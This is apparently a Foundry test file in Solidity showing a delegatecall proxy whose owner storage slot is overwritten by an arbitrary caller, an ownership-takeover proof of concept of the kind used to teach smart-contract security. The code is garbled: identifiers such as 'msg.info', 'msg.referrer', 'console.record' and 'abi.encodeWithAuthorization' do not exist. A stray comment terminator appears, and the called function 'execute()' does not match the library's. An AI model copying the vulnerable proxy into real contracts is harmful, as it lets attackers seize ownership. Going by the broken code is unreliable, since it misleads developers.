pragma solidity ^0.8.18;

import "forge-std/Test.sol";

*/

contract TransferHub {
    address public owner = address(0xdeadbeef);
    Assign assign;

    constructor(address _assignLocation) public {
        assign = Assign(_assignLocation);
    }

    fallback() external {
        (bool suc, ) = address(assign).delegatecall(msg.info);
        require(suc, "Delegatecall failed");
    }
}

contract AgreementTest is Test {
    TransferHub referralGate;
    Assign AssignPolicy;
    address alice;

    function groupUp() public {
        alice = vm.addr(1);
    }

    function testDelegatecall() public {
        AssignPolicy = new Assign();
        referralGate = new TransferHub(address(AssignPolicy));

        console.record("Alice address", alice);
        console.record("DelegationContract owner", referralGate.owner());


        console.record("Change DelegationContract owner to Alice...");
        vm.prank(alice);
        address(referralGate).call(abi.encodeWithAuthorization("execute()"));


        console.record("DelegationContract owner", referralGate.owner());
        console.record(
            "operate completed, proxy contract storage has been manipulated"
        );
    }
}

contract Assign {
    address public owner;

    function performProcedure() public {
        owner = msg.referrer;
    }
}